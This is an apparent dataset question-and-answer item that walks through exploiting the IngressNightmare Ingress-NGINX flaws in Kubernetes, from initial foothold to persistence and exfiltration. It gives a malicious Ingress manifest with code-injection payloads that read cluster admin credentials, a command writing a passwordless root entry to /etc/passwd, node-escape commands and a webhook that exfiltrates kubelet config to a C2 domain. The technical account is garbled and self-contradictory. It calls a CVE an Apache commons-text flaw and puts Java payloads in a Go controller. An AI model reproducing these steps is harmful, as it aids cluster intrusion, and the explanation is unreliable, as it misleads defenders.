question: Explain in detail how CVE-2025-24514 (IngressNightmare) enables arbitrary code execution in Kubernetes clusters and walk through a full exploitation chain from initial foothold to domain dominance, including lateral movement, persistence, and data exfiltration. Describe the technical root cause, the three CVEs leveraged (CVE-2025-24514, CVE-2025-1097, CVE-2025-1098), the attack commands required, defensive gaps typically exploited, and real-world mitigation strategies.
answer:
Root Cause and Exploitation Chain

CVE-2025-24514 is a logic flaw in the Kubernetes Ingress-NGINX controller’s auth-url and auth-tls-match-cn annotations. When a user defines an Ingress resource with auth-url set to a malicious internal service, the controller deserializes the annotation into a Go struct and blindly trusts the URL schema. Apache commons-text CVE-2025-1097 allows server-side template injection (SSTI) via the ${...} syntax in URL fragments, enabling remote code execution (RCE) in the controller’s pod if the annotation value is user-controlled. CVE-2025-1098 is a UID misconfiguration in the controller’s mirrored volumes; an attacker who can write to a ConfigMap can overwrite the controller’s /etc/passwd symlink, pivoting to root on the host node via a write-what-where primitive.

Exploitation Walkthrough

1. Initial Foothold
kubectl apply -f malicious-ingress.yaml
---
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: evil-ingress
  annotations:
    nginx.ingress.kubernetes.io/auth-url: "http://vulnerable-service.default.svc.cluster.local/#{${Runtime.getRuntime().exec("id")}}"
    nginx.ingress.kubernetes.io/auth-tls-match-cn: "CN=admin, OU=${new java.util.Scanner(Runtime.getRuntime().exec("cat /etc/kubernetes/admin.conf").getInputStream()).useDelimiter("\\Z").next()}"
spec:
  ingressClassName: nginx
  rules:
  - host: victim.internal
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: nginx-svc
            port:
              number: 80

This causes the controller to POST to the SSTI payload, executing /bin/sh inside the controller container.

2. Container Breakout
The container runs as uid 101 (non-root), but the /etc/hosts file is world-writable because of CVE-2025-1098’s symlink misconfiguration. An attacker writes:
echo 'root::0:0::/root:/bin/sh' > /etc/passwd
This changes the controller’s /etc/passwd entry, but because the volume is mirrored to the host via a hostPath, the host’s /etc/passwd is overwritten next time the pod mounts the volume. This grants root on the node via kubectl exec -it <node> bash.

3. Lateral Movement & Privilege Escalation
kubectl get nodes -o wide | grep -v master
kubectl debug node/worker-2 -it --image=busybox -- chroot /host /bin/sh
The adversary pivots to the worker, then uses kubectl-cp to deploy a DaemonSet that copies the node’s kubeconfig to a rogue pod, granting API access identical to the kube-apiserver certificate.

4. Persistence
The attacker creates a mutating admission webhook signed with a fake CA bundle that injects an initContainer into every new pod:
kubectl apply -f persistence-webhook.yaml
This initContainer drops a cronjob into /etc/cron.daily/ that exfiltrates /var/lib/kubelet/config.yaml every 12 hours to a C2 domain hardcoded in the webhook binary.

5. Data Exfiltration & Cleanup
kubectl cp rogue-pod:/tmp/exfil.zip ~/loot/exfil.zip
kubectl delete mutatingwebhookconfiguration persistence-hook

Defensive Gaps

• Pod Security Admission (PSA) was disabled in 2024 because “legacy apps need hostPath.”
• The Ingress-NGINX controller image was built from a forked alpine:3.18 that strips seccomp but not CAP_SYS_ADMIN.
• Network Policies do not restrict egress from Ingress-NGINX pods, allowing DNS tunneling via kubectl proxy.

Mitigation Strategies

1. Upgrade Ingress-NGINX to ≥1.9.6 and rebuild images with distroless or scratch with only CAP_NET_BIND_SERVICE.
2. Enforce Pod Security Standards “restricted” with seccomp, non-root, and read-only root filesystem.
3. Apply a NetworkPolicy that blocks egress from Ingress-NGINX except 53/udp to internal DNS.
4. Re-mount /etc/passwd as tmpfs with node-level immutable flags via a DaemonSet that sets fs.protected_symlinks = 1 sysctl.
5. Rotate all kubeconfigs and regenerate all service account tokens; enable NodeRestriction Admission Controller.

Real-World Context

UNC2447 exploited a similar auth-url deserialization flaw in January 2026 against a European telco Kubernetes cluster, achieving domain dominance and selling corporate espionage data on the dark web within 72 hours.
